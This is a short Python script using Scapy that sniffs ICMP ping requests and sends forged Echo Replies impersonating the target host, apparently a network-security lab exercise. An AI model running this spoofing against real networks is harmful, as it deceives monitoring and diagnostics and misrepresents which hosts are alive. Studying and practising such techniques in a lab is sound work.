from scapy.all import *

# Function to handle sniffed ICMP packets and spoof a reply
def icmp_sniff_and_spoof(packet):
    if packet.haslayer(ICMP):
        icmp_layer = packet.getlayer(ICMP)

        # Check if it's an ICMP Echo Request (ping request)
        if icmp_layer.type == 8:  # ICMP Echo Request
            print(f"[+] Intercepted Ping request from {packet[IP].src} to {packet[IP].dst}")

            # Craft a fake ICMP Echo Reply
            ip = IP(src=packet[IP].dst, dst=packet[IP].src)
            icmp = ICMP(type=0, id=icmp_layer.id, seq=icmp_layer.seq)  # type=0 for Echo Reply
            fake_reply = ip / icmp / packet[Raw].load

            # Send the spoofed ICMP Echo Reply
            send(fake_reply)
            print(f"[+] Sent fake Ping reply from {packet[IP].dst} to {packet[IP].src}")

# Sniff ICMP packets and spoof responses
print("Sniffing and spoofing ICMP packets...")
sniff(filter="icmp", prn=icmp_sniff_and_spoof, store=False)
